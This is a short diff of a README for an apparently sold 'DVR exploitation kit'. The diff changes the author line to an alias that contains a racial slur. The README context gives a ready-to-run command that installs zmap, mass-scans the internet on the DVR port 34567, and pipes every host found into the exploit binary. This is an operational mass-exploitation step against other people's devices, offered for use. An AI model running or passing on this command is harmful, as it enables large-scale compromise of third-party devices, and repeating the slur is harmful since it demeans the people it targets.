@@ -1,4 +1,4 @@
-# Sold by koph1n3
+# tooda @ nigga
 
 Setup steps
 
@@ -34,5 +34,6 @@ after compiling the exploit make sure you have zmap installed
 apt install zmap -y
 
 running the exploit
+
 
 ulimit -n 999999; ulimit -a 999999; zmap -p 34567 -T5 -r0 -w dvrip.zone | ./dvr-exploitation-kit --port=34567
